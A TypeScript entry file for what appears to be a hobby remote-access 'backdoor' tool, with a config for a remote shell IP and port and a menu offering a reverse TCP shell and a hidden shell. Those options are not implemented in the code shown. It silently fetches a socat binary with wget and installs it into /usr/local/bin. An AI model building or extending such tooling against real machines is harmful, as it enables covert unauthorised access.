/* eslint-disable eqeqeq */
/* eslint-disable no-case-declarations */
import boxen from 'boxen';
process.argv = process.argv.slice(1); // nex
import yargs, {config} from 'yargs';
import 'colors';
// eslint-disable-next-line @typescript-eslint/ban-ts-ignore
// @ts-ignore
import {select, confirm, text} from 'input';
import {exec} from 'child-process-promise';
import {windowClear, sleep} from './helpers';
import {readFileSync} from 'fs';
const json: {
  remoteShell?: {
    ip?: string;
    port?: number;
  };
  // eslint-disable-next-line @typescript-eslint/no-var-requires
} = JSON.parse(readFileSync('build/config.json').toString());
// import {readFileSync, writeFileSync} from 'fs';
// import {join} from 'path';
// import {stdout} from 'process';
// import child from 'child_process';
const argv = yargs
  .usage('Usage: run `$0` and select what ya wanna do')
  .alias('d', 'default')
  .boolean(['d'])
  .describe('d', 'Use the config.json in the ~/.backdoor/ directory').argv;
if (argv.default) console.log = () => {};
else windowClear();

(async () => {
  console.log(
    `+-------------------------------------------+
|     ____  _______        ____  __ _ _ _   |
|    | __ )| ____\\ \\      / |  \\/  | | | |  |
|    |  _ \\|  _|  \\ \\ /\\ / /| |\\/| | | | |  |
|    | |_) | |___  \\ V  V / | |  | |_|_|_|  |
|    |____/|_____|  \\_/\\_/  |_|  |_(_(_(_)  |
|                                           |
+-------------------------------------------+`.bgYellow
  );
  await sleep(1500);
  console.log('Checking dependencies...');
  try {
    await exec('which socat');
    console.log('socat'.green);
  } catch (e) {
    if (e.stdout == '') {
      console.log('socat'.red);
      console.log("No 'socat' executable found, installing...");
      await exec(
        'wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/darwin/socat -O /tmp/socat'
      );
      console.log('Adding executable tag...');
      await exec('chmod +x /tmp/socat');
      console.log('Moving to /usr/local/bin...');
      await exec('cp /tmp/socat /usr/local/bin/socat');
      console.log('done!');
      console.log('socat'.green);
    }
  }
  console.log('dependencies checked!');
  let exit = false;
  if (argv.default) {
    let config: {
      screen?: boolean;
    };
    try {
      const {stdout} = await exec('Get-Content ~/.backdoor/config.json');
      config = JSON.parse(stdout);
    } catch (e) {
      console.info(e);
      config = {};
    }
    return;
  }
  while (!exit) {
    const res: string = await select(
      "So, Mr. Hackerman, what's on the agenda?",
      [
        'Websocket reverse TCP',
        'Create Hidden Shell (remote access v1)',
        'Exit',
      ]
    );
    switch (res) {
      case 'Exit':
        exit = true;
        console.log('byee!!!');
        await sleep(1500);
        windowClear();
        return;
      default:
        windowClear();
        break;
    }
  }
})();
